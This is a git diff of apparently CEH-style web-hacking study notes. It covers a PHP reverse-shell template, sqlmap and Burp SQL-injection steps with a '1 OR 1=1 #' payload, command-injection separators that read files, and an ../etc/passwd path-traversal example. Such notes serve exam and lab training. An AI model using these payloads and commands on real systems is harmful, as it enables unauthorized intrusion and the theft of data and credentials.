@@ -3,11 +3,39 @@
 /usr/share/webshells/php/php-reverse-shell.php
 just change ip and port in this code
 ```
-
-#### WhatWeb
+#### OWASP ZAP
 ```bash
-whatweb <url>
-whatweb http://www.abc.com
+Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
+```
+#### wapiti
+```bash
+Check for application vulnerabilities
+wapiti -u http://target.com
+wapiti -u http://10.10.10.5
+```
+#### parameter tampering (Page_id =100)
+```bash
+# Quick Notes
+-----------
+wordpress
+sql
+parameter tampering
+nmap -sV --script=http-enum <target>
+-----------
+Check Wordpress module for more details
+
+/index.php?page_id=103 ->  Paramter tampering.
+
+try
+sqlmap -u "http://www.cehorg.com/page.php?page_id=84" --dbs
+
+or
+-> nmap -sV --script=http-enum <target>
+-> Find any input parameter on website and capture the request in burp and then use it to perform sql 
+injection using sqlmap. 
+-? Now open the burp and check the input parameters and intercept on then type some as “1 OR ANY TEXT” 
+you get some value on burp copy that and create the txt file.(1 OR 1=1 #) 
+-> sqlmap -r <txt file from burpsuite> --dbs  
 ```
 ####  flag.txt, example.com at IP
 ```bash
@@ -120,35 +148,6 @@ ip && id
 `| cat "path"` (to display content of file - Linux)
 ```
 
-#### parameter tampering (Page_id =100)
-```bash
-# Quick Notes
------------
-wordpress
-sql
-parameter tampering
-nmap -sV --script=http-enum <target>
------------
-Check Wordpress module for more details
-
-/index.php?page_id=103 ->  Paramter tampering.
-
-try
-sqlmap -u "http://www.cehorg.com/page.php?page_id=84" --dbs
-
-or
--> nmap -sV --script=http-enum <target>
--> Find any input parameter on website and capture the request in burp and then use it to perform sql 
-injection using sqlmap. 
--? Now open the burp and check the input parameters and intercept on then type some as “1 OR ANY TEXT” 
-you get some value on burp copy that and create the txt file.(1 OR 1=1 #) 
--> sqlmap -r <txt file from burpsuite> --dbs  
-```
-
-#### IDOR
-```bash
-We just need to add page=123 => we will get flag
-```
 #### Command Injection
 ```bash
 # Reverse Shell
@@ -183,6 +182,7 @@ If Windows
 #once files are listed
 | type "<Path>"
 
+dir C:\ 
 ```
 
 #### File Upload
@@ -221,21 +221,6 @@ In the Browser to send the data through the Burp-suite(when intercept is on)  we
 
 make sure intercept is on, to intercept traffice
 ```
-
-
-#### Automated Tool - Smart Scanner
-```bash
- cd wapiti
- python3 -m venv wapiti3 #to create a virtual env.
- . wapiti3/bin/activate #activate virtual env.
- pip install . #to intstall wapiti web application scanner
- wapiti -u https://[targetSite]
- 
- #Note: It would take 10min to complete the scan. And the final report 
- /root/.wapiti/generated_report/
- 
-```
-
 #### Dirb
 ```bash
 dirb http://<Meta2IP>
@@ -264,4 +249,5 @@ https://example.com/view?file=images/cat.jpg
 If the server is not validating the file path properly, an attacker could do:
 https://example.com/view?file=../../../../etc/passwd
 ```
+
 
